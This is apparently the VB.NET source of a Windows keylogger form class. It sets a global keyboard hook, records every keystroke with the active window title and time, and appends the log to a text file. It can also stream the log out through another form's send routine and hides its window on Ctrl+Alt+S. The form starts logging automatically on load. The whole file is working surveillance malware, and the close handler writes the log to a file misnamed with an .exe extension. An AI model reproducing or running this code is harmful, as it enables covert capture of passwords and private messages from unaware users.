
Public Class keylog

#Region "API Functions And Structures"

    'Event types
    Private Const WM_KEYUP As Integer = &H101
    Private Const WM_KEYDOWN As Short = &H100S
    Private Const WM_SYSKEYDOWN As Integer = &H104
    Private Const WM_SYSKEYUP As Integer = &H105

    'Event Info structure
    Public Structure KBDLLHOOKSTRUCT
        Public vkCode As Integer 'KeyCode (Of interest to us)
        Public scanCode As Integer 'ScanCode
        Public flags As Integer
        Public time As Integer
        Public dwExtraInfo As Integer
    End Structure

    Enum virtualKey

        'Misc
        K_Return = &HD
        K_Backspace = &H8
        K_Space = &H20
        K_Tab = &H9
        K_Esc = &H1B

        K_Control = &H11
        K_LControl = &HA2
        K_RControl = &HA3

        K_Delete = &H2E
        K_End = &H23
        K_Home = &H24
        K_Insert = &H2D

        K_Shift = &H10
        K_LShift = &HA0
        K_RShift = &HA1

        K_Pause = &H13
        K_PrintScreen = 44

        K_LWin = &H5B
        K_RWin = &H5C

        K_Alt = &H12
        K_LAlt = &HA4
        K_RAlt = &HA5

        'Locks
        K_NumLock = &H90
        K_CapsLock = &H14

        'Arrows
        K_Up = &H26
        K_Down = &H28
        K_Right = &H27
        K_Left = &H25

        'F1-24
        K_F1 = &H70
        K_F2 = &H71
        K_F3 = &H72
        K_F4 = &H73
        K_F5 = &H74
        K_F6 = &H75
        K_F7 = &H76
        K_F8 = &H77
        K_F9 = &H78
        K_F10 = &H79
        K_F11 = &H7A
        K_F12 = &H7B
        K_F13 = &H7C
        K_F14 = &H7D
        K_F15 = &H7E
        K_F16 = &H7F
        K_F17 = &H80
        K_F18 = &H81
        K_F19 = &H82
        K_F20 = &H83
        K_F21 = &H84
        K_F22 = &H85
        K_F23 = &H86
        K_F24 = &H87

        'Numpad
        K_Numpad0 = &H60
        K_Numpad1 = &H61
        K_Numpad2 = &H62
        K_Numpad3 = &H63
        K_Numpad4 = &H64
        K_Numpad5 = &H65
        K_Numpad6 = &H66
        K_Numpad7 = &H67
        K_Numpad8 = &H68
        K_Numpad9 = &H69
        'Math (numpad)
        K_Num_Add = &H6B
        K_Num_Divide = &H6F
        K_Num_Multiply = &H6A
        K_Num_Subtract = &H6D
        K_Num_Decimal = &H6E

        'Caracteres e Números
        K_0 = &H30
        K_1 = &H31
        K_2 = &H32
        K_3 = &H33
        K_4 = &H34
        K_5 = &H35
        K_6 = &H36
        K_7 = &H37
        K_8 = &H38
        K_9 = &H39
        K_A = &H41
        K_B = &H42
        K_C = &H43
        K_D = &H44
        K_E = &H45
        K_F = &H46
        K_G = &H47
        K_H = &H48
        K_I = &H49
        K_J = &H4A
        K_K = &H4B
        K_L = &H4C
        K_M = &H4D
        K_N = &H4E
        K_O = &H4F
        K_P = &H50
        K_Q = &H51
        K_R = &H52
        K_S = &H53
        K_T = &H54
        K_U = &H55
        K_V = &H56
        K_W = &H57
        K_X = &H58
        K_Y = &H59
        K_Z = &H5A

        'Math (not numpad)
        K_Subtract = 189
        K_Decimal = 190

    End Enum

    'Keyboard hook related functions
    Private Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Integer) As Integer
    Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Integer, ByVal lpfn As KeyboardHookDelegate, ByVal hmod As Integer, ByVal dwThreadId As Integer) As Integer
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Integer
    Private Declare Function CallNextHookEx Lib "user32" (ByVal hHook As Integer, ByVal nCode As Integer, ByVal wParam As Integer, ByVal lParam As KBDLLHOOKSTRUCT) As Integer
    Private Delegate Function KeyboardHookDelegate(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer

    'Other API functions
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
#End Region


    Private KeyboardHandle As IntPtr = 0 'Handle of the hook
    Private LastCheckedForegroundTitle As String = "" 'Title of the foreground window when last checked
    Private callback As KeyboardHookDelegate = Nothing 'Delegate for the hook

    Private KeyLog As String 'Variable which holds the text to be appended to the text file

    ''' <summary>
    ''' Gets the title of the active window
    ''' </summary>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Function GetActiveWindowTitle() As String
        Dim MyStr As String
        MyStr = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, MyStr, 100)
        MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)

        Return MyStr
    End Function

    ''' <summary>
    ''' Checks if we set a hook or not
    ''' </summary>
    ''' <returns>True/False</returns>
    ''' <remarks></remarks>
    Private Function Hooked()
        Return KeyboardHandle <> 0 'If KeyboardHandle = 0 it means that it isn't hooked so return false, otherwise return true
    End Function

    ''' <summary>
    ''' Sets the keyboard hook
    ''' </summary>
    ''' <remarks></remarks>
    ''' 






    Public live As Boolean = False



    Public Sub HookKeyboard()
        callback = New KeyboardHookDelegate(AddressOf KeyboardCallback)
        KeyboardHandle = SetWindowsHookEx(13, callback, Process.GetCurrentProcess.MainModule.BaseAddress, 0)
        If KeyboardHandle <> 0 Then
            Me.btnStop.Enabled = True
            Me.btnStart.Enabled = False
            Label1.Text = "Active"
            Label1.ForeColor = Color.DarkGreen
        End If
    End Sub

    ''' <summary>
    ''' Unsets the keyboard hook
    ''' </summary>
    ''' <remarks></remarks>
    Public Sub UnhookKeyboard()
        If (Hooked()) Then
            If UnhookWindowsHookEx(KeyboardHandle) <> 0 Then
              
                KeyboardHandle = 0 'We have unhooked successfully
            End If
        End If
    End Sub

    ''' <summary>
    ''' Function to be called when there's a keyboard event
    ''' </summary>
    ''' <param name="Code">If this argument is lower than 0 you shouldn't block the event</param>
    ''' <param name="wParam">Type of event (Key UP/DOWN, etc.)</param>
    ''' <param name="lParam">Event Details</param>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Public Function KeyboardCallback(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer

        'Get current foreground window title
        Dim CurrentTitle As String = GetActiveWindowTitle()

        'If title of the foreground window changed
        If CurrentTitle <> LastCheckedForegroundTitle Then
            LastCheckedForegroundTitle = CurrentTitle
            'Add a little header containing the application title and date

            KeyLog &= Environment.NewLine & Environment.NewLine & vbCrLf & "[" & CurrentTitle & " (" & Now.ToString() & ") ]" & vbCrLf
        End If

        'Variable to hold the text describing the key pressed
        Dim Key As String = ""

        'If event is KEYDOWN
        If wParam = WM_KEYDOWN Or wParam = WM_SYSKEYDOWN Then

            'If we can block events
            If Code >= 0 Then
                'If Ctrl+Alt+S
                If My.Computer.Keyboard.CtrlKeyDown And My.Computer.Keyboard.AltKeyDown And lParam.vkCode = virtualKey.K_S Then
                    Me.Visible = Not Me.Visible 'Hide/Show form
                    Return 1 'Block event
                End If
            End If

            'Translate virtual key into character/expression
            Select Case lParam.vkCode
                Case virtualKey.K_0 To virtualKey.K_9
                    Key = ChrW(lParam.vkCode)
                Case virtualKey.K_A To virtualKey.K_Z
                    Key = ChrW(lParam.vkCode + 32)
                Case virtualKey.K_Space
                    Key = " "
                Case virtualKey.K_RControl, virtualKey.K_LControl
                    Key = "[control]"
                Case virtualKey.K_LAlt
                    Key = "[alt]"
                Case virtualKey.K_RAlt
                    Key = "[alt gr]"
                Case virtualKey.K_LShift, virtualKey.K_RShift
                    Key = "[shift]"
                Case virtualKey.K_Return
                    Key = vbCrLf
                Case virtualKey.K_Tab
                    Key = vbTab
                Case virtualKey.K_Delete
                    Key = "[delete]"
                Case virtualKey.K_Esc
                    Key = "[esc]"
                Case virtualKey.K_CapsLock
                    If My.Computer.Keyboard.CapsLock Then
                        Key = "[/caps]"
                    Else
                        Key = "[caps]"
                    End If
                Case virtualKey.K_F1 To virtualKey.K_F24
                    Key = "[F" & (lParam.vkCode - 111) & "]"
                Case virtualKey.K_Right
                    Key = "[Right Arrow]"
                Case virtualKey.K_Down
                    Key = "[Down Arrow]"
                Case virtualKey.K_Left
                    Key = "[Left Arrow]"
                Case virtualKey.K_Up
                    Key = "[Up Arrow]"
                Case virtualKey.K_Backspace
                    Key = "[bkspace]"
                Case virtualKey.K_Decimal, virtualKey.K_Num_Decimal
                    Key = "."
                Case virtualKey.K_Subtract, virtualKey.K_Num_Subtract
                    Key = "-"
                Case Else
                    Key = lParam.vkCode 'If we didn't treat it, show the virtual key code (integer) so that we know what Case to add
            End Select

            'If event is Key UP
        ElseIf wParam = WM_KEYUP Or wParam = WM_SYSKEYUP Then
            Select Case lParam.vkCode
                Case virtualKey.K_RControl, virtualKey.K_LControl
                    Key = "[/control]"
                Case virtualKey.K_LAlt
                    Key = "[/alt]"
                Case virtualKey.K_RAlt
                    Key = "[/alt gr]"
                Case virtualKey.K_LShift, virtualKey.K_RShift
                    Key = "[/shift]"
            End Select

        End If

        'Add it to the log
        KeyLog &= Key
        If Key <> "" Then
            '  Me.TextBox1.Text &= (Key) 'Add it to the listbox for debugging purposes
        End If

        Return CallNextHookEx(KeyboardHandle, Code, wParam, lParam) 'Let event go to the other applications

    End Function

    ''' <summary>
    ''' On tick
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    ''' <remarks></remarks>
    Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As System.EventArgs) Handles Timer1.Tick
       
        Try
            If Not KeyLog = "" Then

                My.Computer.FileSystem.WriteAllText(CurDir() & "\funbags.txt", KeyLog, True)
                
                If Form1.live = True Then
                    Form1.sendstream2("2*" & KeyLog.ToString)

                    'Form1.sendstream2("2*" & KeyLog)


                    KeyLog = ""
                End If
                KeyLog = ""
            End If



        Catch ex As Exception

        End Try

    End Sub

    ''' <summary>
    ''' On Form Exit
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    ''' <remarks></remarks>
    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing

        UnhookKeyboard()
        My.Computer.FileSystem.WriteAllText(CurDir() & "\funbags.exe", KeyLog, True)

    End Sub

    ''' <summary>
    ''' Start Hook
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    ''' <remarks></remarks>
    Private Sub btnStart_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnStart.Click

        Timer1.Start()
        HookKeyboard()

    End Sub

    ''' <summary>
    ''' Stop the hook
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    ''' <remarks></remarks>
    Private Sub btnStop_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnStop.Click

        Timer1.Stop()
        UnhookKeyboard()

    End Sub

    ''' <summary>
    ''' Exit Program
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    ''' <remarks></remarks>
    Private Sub btnExit_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnExit.Click

        Timer1.Enabled = False
        Me.Close()

    End Sub

    Private Sub keylog_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        Timer1.Enabled = True
        HookKeyboard()

    End Sub

  
  
End Class